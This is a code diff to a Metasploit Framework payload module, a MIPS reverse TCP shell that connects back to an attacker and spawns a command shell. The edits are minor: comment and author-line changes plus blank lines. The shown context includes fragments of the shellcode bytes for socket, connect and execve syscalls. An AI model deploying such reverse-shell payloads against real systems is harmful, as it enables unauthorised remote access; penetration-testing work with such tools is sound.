@@ -3,9 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-# Written in a hurry using shellforge and my MIPS shellforge loader (avail. on cr0.org)
-# + Few removals of unneccessary zero bytes by kost
-
 require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
@@ -23,7 +20,7 @@ module Metasploit3
       'Description'   => 'Connect back to attacker and spawn a command shell',
       'Author'        =>
         [
-          'rigan <imrigan[at]gmail.com>', # Original shellcode
+          'rigan <imrigan[at]gmail.com>', # Original (mipsbe) shellcode
           'juan vazquez' # Metasploit module
         ],
       'License'       => MSF_LICENSE,
@@ -62,6 +59,7 @@ module Metasploit3
       "\xff\xff\x06\x28" + # slti a2,zero,-1
       "\x57\x10\x02\x24" + # li v0,4183 # sys_socket
       "\x0c\x01\x01\x01" + # syscall 0x40404
+
       # sys_connect
       # a0: sockfd (stored on the stack)
       # a1: addr (data stored on the stack)
@@ -114,6 +112,7 @@ module Metasploit3
       "\xf8\xff\xa5\x27" + # addiu a1,sp,-8
       "\xab\x0f\x02\x24" + # li v0,4011 # sys_execve
       "\x0c\x01\x01\x01"  # syscall 0x40404
+
     return super + shellcode
   end
 
